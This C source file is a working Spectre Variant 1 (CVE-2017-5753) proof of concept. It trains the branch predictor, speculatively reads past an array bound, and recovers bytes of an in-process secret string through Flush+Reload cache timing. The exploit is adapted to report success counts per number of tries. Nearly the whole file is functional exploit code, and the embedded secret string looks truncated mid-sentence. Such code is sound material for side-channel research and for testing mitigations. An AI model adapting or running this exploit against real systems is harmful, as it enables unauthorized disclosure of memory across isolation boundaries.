/**
 * Spectre - Variant 1: Bounds Check Bypass (CVE-2017-5753)
 *
 * Description:
 *
 * Systems with microprocessors utilizing speculative execution and branch prediction
 * may allow unauthorized disclosure of information to an attacker with local user access
 * via a side-channel analysis.
 *
 */


#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif
//################################################
#define CACHE_PAGE      4096            // 2^12 -> shl $12, %rax

#define flush_pipeline                      \
    asm volatile(                           \
        "cpuid\n"                           \
        "mfence\n"                          \
        :                                   \
        :                                   \
        : "rax","rbx","rcx","rdx","memory");

typedef struct {
    uint8_t unused_1[CACHE_PAGE];       // Memory separator
    union {
        size_t x;                       // Valid array index for speculative storage (for Spectre V4)
        uint8_t unused_2[CACHE_PAGE];   // Memory separator
    };
    union {
        size_t indices_size;            // Indices array size (for Spectre V1/V4)
        uint8_t unused_3[CACHE_PAGE];   // Memory separator
    };
    union {
        uint8_t indices[16];            // Array with valid indices (for Spectre V1/V4)
        uint8_t unused_4[CACHE_PAGE];   // Memory separator
    };
    uint8_t table[256 * CACHE_PAGE];    // Array for Flush+Reload tests
    uint8_t unused_5[CACHE_PAGE];       // Memory separator
} memory_buffer_t;

typedef struct {
    int tries;
    int zero;
    int s1;
    int s2;
    uint8_t v1;
    uint8_t v2;
} result_t;

//char *secret = "The Magic Words are Squeamish Ossifrage.";
char *secret = "Spectre breaks the isolation between different applications. It allows an attacker to trick er-free.";

memory_buffer_t buffer = {
    .indices_size = 16,
    .indices = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16}
};



typedef size_t (*exploit_handler)(size_t address, int tries);

int execute(void *addres, size_t len, int tries, exploit_handler exploit);
//################################################
uint8_t temp = 0; // To not optimize victim() function

void victim(size_t x) {
    if (x < buffer.indices_size) {
        temp &= buffer.table[buffer.indices[x] * CACHE_PAGE];
    }
}

size_t exploit(size_t address, int tries) {
    size_t malicious_x = address - (size_t)buffer.indices;  // Set a malicious (speculative) array index
    size_t training_x = tries % buffer.indices_size;        // Set a valid (training) array index
    
    // 30 loops: 5 training runs (x = training_x), one attack run (x = malicious_x)
    for (int i = 29; i >= 0; i--) {
        _mm_clflush(&buffer.indices_size);          // Flush indices array size from cache to force branch prediction
        flush_pipeline;
        
        // Bit twiddling to set x = training_x if i % 6 != 0 or malicious_x if i % 6 == 0
        // Avoid jumps in case those tip off the branch predictor
        size_t x = ((i % 6) - 1) & ~0xFFFF; // Set x = FFFFF0000 if i % 6 == 0, else x = 0
        x = (x | (x >> 16));                // Set x = -1 if i & 6 = 0, else x = 0
        x = training_x ^ (x & (malicious_x ^ training_x));
        
        victim(x);
    }
    
    // Return the training index to exclude it from Flush+Reload test
    return buffer.indices[training_x];
}
//################################

//################################




static void print_dump(const unsigned char *p, size_t size) {
    unsigned char c[16];
    char h[16][3];
    char *tpl = "%08X  %s %s %s %s %s %s %s %s  %s %s %s %s %s %s %s %s  |%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c|\n";
    
    for (int i = 0; i < size; i ++) {
        int k = i % 16;
        unsigned char v = p[i];
        sprintf(h[k], "%02X", v);
        c[k] = (v >= 0x20 && v <= 0x7E) ? v : '.';
        
        if (k == 15 || i == size - 1) {
            if (i == size - 1) {
                for (int j = k + 1; j < 16; j++) {
                    c[j] = ' ';
                    h[j][0] = ' ';
                    h[j][1] = ' ';
                    h[j][2] = 0;
                }
            }
            printf(tpl, (i / 16) * 16, h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8], h[9], h[10], h[11], h[12], h[13], h[14], h[15],
                c[0], c[1], c[2], c[3], c[4], c[5], c[6], c[7], c[8], c[9], c[10], c[11], c[12], c[13], c[14], c[15]);
        }
    }
}

static size_t detect_flush_reload_threshold(void) {
    size_t reload_time = 0, flush_reload_time = 0, threshold, count = 1000000;
    uint64_t start = 0, end = 0;
    uint8_t dummy[4096];
    uint8_t *ptr = dummy + 2048;
    volatile uint8_t *vptr = ptr; // To avoid optimization
    unsigned int junk = 0;

    junk = *vptr;
    for (int i = 0; i < count; i++) {
        start = __rdtscp(&junk);
        junk = *vptr;
        end = __rdtscp(&junk);
        reload_time += (end - start);
    }
    
    for (int i = 0; i < count; i++) {
        _mm_clflush(ptr);
        start = __rdtscp(&junk);
        junk = *vptr;
        end = __rdtscp(&junk);
        flush_reload_time += (end - start);
    }
    reload_time /= count;
    flush_reload_time /= count;

    //printf("Flush+Reload: %zd cycles, Reload only: %zd cycles\n", flush_reload_time, reload_time);
    threshold = (flush_reload_time + reload_time * 2) / 3;
    //printf("Flush+Reload threshold: %zd cycles\n", threshold);
    
    return threshold;
}

static void read_byte(size_t address, result_t *result, int tries, size_t threshold, exploit_handler exploit) {
    unsigned int junk = 0;
    volatile uint8_t *addr;
    int v1 = -1, v2 = -1, v3 = -1;
    int s[256];
    
    memset(result, 0, sizeof(*result));
    memset(s, 0, sizeof(s));
    
    for (result->tries = 0; result->tries < tries; result->tries++) {
        size_t exclude_i = exploit(address, result->tries);
        
        // Time reads. Order is slightly mixed up to prevent stride prediction
        for (int i = 0; i < 256; i++) {
            register uint64_t time1, time2;
            int mix_i = ((i * 167) + 13) & 255;
            addr = buffer.table + mix_i * CACHE_PAGE;
            time1 = __rdtscp(&junk);
            junk = *addr;
            time2 = __rdtscp(&junk) - time1;
            
            if (time2 <= threshold && mix_i != exclude_i) {
                s[mix_i]++; // Cache hit -> score +1 for this value
            }
            
            _mm_clflush((void *)addr); // Flush from cache and try next address
        }
        
        // Locate 3 highest bytes
        v1 = v2 = v3 = -1;
        for (int i = 0; i < 256; i++) {
            if (s[i] == 0) {
                continue;
            }
            if (v1 < 0 || s[i] > s[v1]) {
                v3 = v2;
                v2 = v1;
                v1 = i;
            } else if (v2 < 0 || s[i] > s[v2]) {
                v3 = v2;
                v2 = i;
            } else if (v3 < 0 || s[i] > s[v3]) {
                v3 = i;
            }
        }
        
        if (v1 > 0) {
            // First byte has non-zero value
            if (v2 != -1) {
                // Second best byte defined
                if (s[v1] > 2 * s[v2] + 2) {
                    result->tries++;
                    break;
                }
            } else {
                // Only first byte defined
                if (s[v1] > 2) {
                    result->tries++;
                    break;
                }
            }
        } else if (v1 == 0 && v2 != -1) {
            // First byte has zero value & second best byte defined
            // Possible misprediction for spectre_v1 and meltdown_fast
            if (v3 != -1) {
                // Third best byte defined
                if (s[v2] > 2 * s[v3] + 2) {
                    result->tries++;
                    break;
                }
            } else {
                // Third best byte undefined
                if (s[v2] > 2) {
                    result->tries++;
                    break;
                }
            }
        }
    }
    
    if (v1 > 0) {
        // First byte has non-zero value
        result->v1 = (uint8_t)v1;
        result->s1 = s[v1];
        if (v2 != -1) {
            // Second best value defined
            result->v2 = (uint8_t)v2;
            result->s2 = s[v2];
        }
    } else if (v1 == 0) {
        // First byte has zero value
        // Possible misprediction for spectre_v1 and meltdown_fast
        result->zero = s[v1];
        if (v2 != -1) {
            // Second best byte defined
            result->v1 = (uint8_t)v2;
            result->s1 = s[v2];
            if (v3 != -1) {
                // Third best byte defined
                result->v2 = (uint8_t)v3;
                result->s2 = s[v3];
            }
        } else {
            // Zero is the correct value for first byte
            // No misprediction
            result->v1 = (uint8_t)v1;
            result->s1 = s[v1];
        }
    }
}

int execute(void *addres, size_t len, int tries, exploit_handler exploit) {
    uint8_t *dump = malloc(len);
    if (dump == NULL) {
        printf("Memory allocation error!\n");
        return 1;
    }
    int count=0;
    // Write data to table array to ensure it is memory backed
    memset(buffer.table, 1, sizeof(buffer.table));
    
    size_t threshold = detect_flush_reload_threshold();
    size_t x = (size_t)addres;
    
    // Flush table[CACHE_PAGE * (0..255)] from cache
    for (int i = 0; i < 256; i++) {
        _mm_clflush(buffer.table + i * CACHE_PAGE);
    }
    
    //printf("Reading %zd bytes in %d tries:\n", len, tries);
    //printf("%p    STATUS  1st   SCORE  2nd   SCORE TRIES ZEROS\n", (void *)x);
    
    for (int i = 0; i < len; i++) {
        result_t result;
        
        //printf("%p ", (void *)x);
        read_byte(x++, &result, tries, threshold, exploit);
        
        /*if (result.s1 > 0) {
            printf("%9s ", result.zero > 0 ? "Zero" : (result.s1 >= 2 * result.s2 + 2 ? "Success" : "Unclear"));
            printf("0x%02X %c %5d ", result.v1, (result.v1 >= 0x20 && result.v1 <= 0x7E) ? result.v1 : ' ', result.s1);
            if (result.s2 > 0) {
                printf("0x%02X %c %5d ", result.v2, (result.v2 >= 0x20 && result.v2 <= 0x7E) ? result.v2 : ' ', result.s2);
            } else {
                printf("   -       - ");
            }
            printf("%5d ", result.tries);
            if (result.zero > 0) {
                printf("%5d", result.zero);
            } else {
                printf("    -");
            }
        } else {
            
            printf("%9s    -       -    -       - %5d     -", "Undefined", result.tries);
            count++;
        }*/
        if(result.s1<=0){
          count++;
        }
       
        //printf("\n");
        
        dump[i] = result.v1;
    }
    
    //printf("\n");
    printf("%d,%d\n",tries,count);
    //print_dump(dump, len);
    
    return 0;
}
//################################

int main(int argc, const char **argv) {
    void *address = secret;
    size_t len = strlen(secret);
    //printf("len is : %ld",len );
    if(argc!=2){
      printf("Usage: %s input parameter\n",argv[0]);
      return 1;
    }
    int count=atoi(argv[1]);
    
    //printf("CVE-2017-5753: Spectre Variant 1\n");
    return execute(address, len, count, exploit);
    //return 0;
}
